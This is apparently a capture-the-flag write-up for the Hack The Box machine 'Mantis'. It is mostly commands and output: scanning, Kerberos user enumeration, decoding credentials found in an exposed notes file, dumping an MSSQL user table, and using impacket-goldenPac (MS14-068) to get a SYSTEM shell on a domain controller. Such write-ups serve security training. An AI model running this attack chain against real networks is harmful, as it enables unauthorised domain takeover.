# Mantis
## Clear-text
## SQL
## Dbeaver
## CVE
## impacket-mssqlclient
## impacket-goldenPac
``````

➜  ~ echo "10.10.10.52 mantis.htb" | sudo tee -a /etc/hosts

➜  ~ rustscan -a mantis.htb --ulimit 5000

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
1337/tcp  open  waste            syn-ack
1433/tcp  open  ms-sql-s         syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5722/tcp  open  msdfsr           syn-ack
8080/tcp  open  http-proxy       syn-ack
49152/tcp open  unknown          syn-ack
49153/tcp open  unknown          syn-ack
49154/tcp open  unknown          syn-ack
49155/tcp open  unknown          syn-ack
49157/tcp open  unknown          syn-ack
49158/tcp open  unknown          syn-ack
49164/tcp open  unknown          syn-ack
49166/tcp open  unknown          syn-ack
49168/tcp open  unknown          syn-ack
50255/tcp open  unknown          syn-ack

➜  ~ sudo nmap -Pn -sV -T4 -p- -oA ~/htb/Active_Directory_101/Mantis/ -vv mantis.htb

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-06 10:47:45Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
1337/tcp  open  http         syn-ack ttl 127 Microsoft IIS httpd 7.5
1433/tcp  open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2014 12.00.2000
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5722/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
8080/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49164/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49166/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49168/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
50255/tcp open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2014 12.00.2000
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

➜  ~ dirsearch --url mantis.htb:8080 

Output File: /home/windows_kali/.dirsearch/reports/8080_22-07-06_10-49-43.txt

[10:49:43] Starting: 
[10:49:45] 403 -  312B  - /%2e%2e//google.com
[10:50:36] 302 -  163B  - /ADMIN  ->  /Users/Account/AccessDenied?ReturnUrl=%2FADMIN
[10:50:38] 302 -  163B  - /Admin  ->  /Users/Account/AccessDenied?ReturnUrl=%2FAdmin
[10:50:57] 400 -    3KB - /Trace.axd::$DATA
[10:51:05] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[10:51:23] 302 -  163B  - /admin  ->  /Users/Account/AccessDenied?ReturnUrl=%2Fadmin
[10:51:28] 302 -  166B  - /admin/  ->  /Users/Account/AccessDenied?ReturnUrl=%2Fadmin%2F
[10:51:28] 302 -  177B  - /admin/?/login  ->  /Users/Account/AccessDenied?ReturnUrl=%2Fadmin%2F%3F%2Flogin
[10:52:25] 200 -    3KB - /archive
[10:52:40] 200 -    3KB - /blogs
[10:53:52] 400 -    3KB - /index.php::$DATA
[10:53:59] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc
[10:53:59] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage
[10:53:59] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true
[10:53:59] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
[10:53:59] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
[10:53:59] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
[10:53:59] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*
[10:53:59] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
[10:53:59] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
[10:53:59] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
[10:53:59] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
[10:53:59] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
[10:54:26] 302 -  176B  - /modules/admin/  ->  /Users/Account/AccessDenied?ReturnUrl=%2Fmodules%2Fadmin%2F
[10:55:42] 200 -    2KB - /tags
[10:55:58] 302 -  171B  - /users/admin  ->  /Users/Account/AccessDenied?ReturnUrl=%2Fusers%2Fadmin
[10:56:05] 400 -    3KB - /web.config::$DATA

➜  ~ sudo nmap -Pn -A -T4 -p- -vv mantis.htb  

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-06 11:08:44Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
1337/tcp  open  http         syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2014 12.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-07-06T10:44:22
| Not valid after:  2052-07-06T10:44:22
| MD5:   3718 cba7 ee6d e419 c5cb c79e 5e69 afff
| SHA-1: 4b94 f54c 6bd8 5d82 e0a3 8bd9 0c65 b9bd 765d ab32
| -----BEGIN CERTIFICATE-----
| MIIB+zCCAWSgAwIBAgIQNbPfUJO8LaVNwCdxDHbhPzANBgkqhkiG9w0BAQUFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjIwNzA2MTA0NDIyWhgPMjA1MjA3MDYxMDQ0MjJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAqlAOwYlNQkes
| IZ77lN3IwEG1vsUvV7C3yfdNMGD38QrpSBEeRqJ2Sdsqr1h0imkNVOgjedpCSwF+
| zJLtGEm278Lz7EPwUm50npB/2VVw7RhgupOUY37/0yX7CL5KXlKlqerbtGgE8Amc
| FwPl4AVB7Wde7CKJgIeSydMVGGpdIEsCAwEAATANBgkqhkiG9w0BAQUFAAOBgQB8
| Qz1eZZF5a/E5Yo1X7tLcE4qrVk2YmvnvNPL8UByA5UmpiZjHJ+vfhCMu0w3NkB3z
| Qny4fKZPFKQOifx2vdjaXYYjBvAMcPQ2YYJKsaJfj2AenSuFlIXptats32v51lwk
| 3S9SvT2evWj+v4YKcLTsX+mkwp/kZe4CtVMmWGQVIA==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-07-06T11:10:02+00:00; -5h00m01s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5722/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
8080/tcp  open  http         syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49164/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49166/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49168/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
50255/tcp open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2014 12.00.2000
|_ssl-date: 2022-07-06T11:10:03+00:00; -5h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-07-06T10:44:22
| Not valid after:  2052-07-06T10:44:22
| MD5:   3718 cba7 ee6d e419 c5cb c79e 5e69 afff
| SHA-1: 4b94 f54c 6bd8 5d82 e0a3 8bd9 0c65 b9bd 765d ab32
| -----BEGIN CERTIFICATE-----
| MIIB+zCCAWSgAwIBAgIQNbPfUJO8LaVNwCdxDHbhPzANBgkqhkiG9w0BAQUFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjIwNzA2MTA0NDIyWhgPMjA1MjA3MDYxMDQ0MjJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAqlAOwYlNQkes
| IZ77lN3IwEG1vsUvV7C3yfdNMGD38QrpSBEeRqJ2Sdsqr1h0imkNVOgjedpCSwF+
| zJLtGEm278Lz7EPwUm50npB/2VVw7RhgupOUY37/0yX7CL5KXlKlqerbtGgE8Amc
| FwPl4AVB7Wde7CKJgIeSydMVGGpdIEsCAwEAATANBgkqhkiG9w0BAQUFAAOBgQB8
| Qz1eZZF5a/E5Yo1X7tLcE4qrVk2YmvnvNPL8UByA5UmpiZjHJ+vfhCMu0w3NkB3z
| Qny4fKZPFKQOifx2vdjaXYYjBvAMcPQ2YYJKsaJfj2AenSuFlIXptats32v51lwk
| 3S9SvT2evWj+v4YKcLTsX+mkwp/kZe4CtVMmWGQVIA==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601

Host script results:
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2022-07-06T07:09:53-04:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26415/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 10637/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19802/udp): CLEAN (Timeout)
|   Check 4 (port 28317/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: -4h25m42s, deviation: 1h30m43s, median: -5h00m00s
| smb2-time: 
|   date: 2022-07-06T11:09:55
|_  start_date: 2022-07-06T10:43:55

➜  ~ cd /opt/kerbrute/dist 
➜  dist git:(master) ls
kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe
➜  dist git:(master) ./kerbrute_linux_amd64 userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc mantis.htb

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 07/06/22 - Ronnie Flathers @ropnop

2022/07/06 11:01:12 >  Using KDC(s):
2022/07/06 11:01:12 >  	mantis.htb:88

2022/07/06 11:01:12 >  [+] VALID USERNAME:	 james@htb.local
2022/07/06 11:01:16 >  [+] VALID USERNAME:	 James@htb.local
2022/07/06 11:01:29 >  [+] VALID USERNAME:	 administrator@htb.local
2022/07/06 11:01:43 >  [+] VALID USERNAME:	 mantis@htb.local
2022/07/06 11:02:14 >  [+] VALID USERNAME:	 JAMES@htb.local
2022/07/06 11:03:25 >  [+] VALID USERNAME:	 Administrator@htb.local
2022/07/06 11:04:27 >  [+] VALID USERNAME:	 Mantis@htb.local

➜  ~ echo "administrator\njames\nmantis" > usernames.txt

ASP-Roasting !== true

➜  ~ for user in $(cat usernames.txt); do impacket-GetNPUsers htb.local/${user} -no-pass -dc-ip mantis.htb; done                    
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for administrator
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for james
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for mantis
[-] User mantis doesnt have UF_DONT_REQUIRE_PREAUTH set

➜  ~ dirsearch --url mantis.htb:1337 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/windows_kali/.dirsearch/reports/1337_22-07-06_11-22-41.txt

[11:22:41] Starting: 
[11:23:31] 500 -    3KB - /orchard
[11:26:17] 301 -  159B  - /secure_notes  ->  http://mantis.htb:1337/secure_notes/

Go to:

http://mantis.htb:1337/secure_notes/

Find:

http://mantis.htb:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt

Content:

1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.

...
...
...

Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez

http://mantis.htb:1337/secure_notes/web.config

Content:

404 - File or directory not found.
The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.

https://www.tunnelsup.com/hash-analyzer/

Take:

NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx

From:

http://mantis.htb:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt

Go to:

https://www.tunnelsup.com/hash-analyzer/

Response:

Character type: base64

➜  ~ echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d

6d2424716c5f53405f504073735730726421

➜  ~ echo "6d2424716c5f53405f504073735730726421%" | xxd -r -p 

m$$ql_S@_P@ssW0rd!

➜  ~ perl -lpe '$_=pack"B*",$_' < <( echo 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001 )

@dm!n_P@ssW0rd!

➜  ~ impacket-mssqlclient admin@mantis.htb

Password: m$$ql_S@_P@ssW0rd!

List all database names

SQL> select name from master.sys.databases

master
tempdb
model
msdb
orcharddb

SQL> select * from information_schema.tables

TABLE_NAME

spt_fallback_db
spt_fallback_dev
spt_fallback_usg
spt_values
spt_monitor
MSreplication_options

SQL> select * from orcharddb.information_schema.tables
SQL> select * from information_schema.columns where table_name = 'blog_Orchard_Users_UserPartRecord'
SQL> SELECT * FROM orcharddb.dbo.blog_Orchard_Users_UserPartRecord

admin:AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==

James:J@m3s_P@ssW0rd!

Back to:

➜  ~ sudo nmap -Pn -sV -T4 -p- -oA ~/htb/Active_Directory_101/Mantis/ -vv mantis.htb

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)

GoogleFu:

Windows Server 2008 R2 SP1 kerberos exploit

Go to:

https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068

## Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780)
## Affected Software
**Operating System**
[Windows Server 2008 for x64-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=946432d6-4fa8-4d86-9d8e-f45855534603) (Server Core installation) (3011780)

GoogleFu:

MS14-068

Find:

https://www.trustedsec.com/blog/ms14-068-full-compromise-step-step/

GoogleFu:

MS14-068 impacket

Find:

https://github.com/mubix/akb/blob/master/Impacket/MS14-068.md

It does not mention the requirement to sync local vm time to domain time
Install rdate and sync ipv4 accordingly

➜  sudo apt install rdate

➜  sudo rdate -4ns 10.10.10.52

➜  ~ cat /etc/hosts | tail -1

10.10.10.52 mantis.htb.local htb.local

➜  ~ impacket-goldenPac -dc-ip 10.10.10.52 HTB.LOCAL/james@mantis.htb.local

C:\Windows\system32>whoami

nt authority\system

C:\Windows\system32>dir C:\Users /s /b | findstr /e .txt

C:\Users\james\Desktop\user.txt

C:\Windows\system32>type C:\Users\james\Desktop\user.txt

user_flag

C:\Windows\system32>type c:\Users\administrator\Desktop\root.txt

root_flag

``````

##### References
https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068
https://www.trustedsec.com/blog/ms14-068-full-compromise-step-step/
https://github.com/mubix/akb/blob/master/Impacket/MS14-068.md

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706110613.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706114400.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706112805.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706112855.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706113918.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706113949.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706102401.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706114006.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706115053.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706115026.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706114917.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706114932.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706114956.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706133145.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706133215.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706133515.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706133713.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706133819.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706133830.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706135958.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706140021.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706145054.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220706144943.png)

#hacking
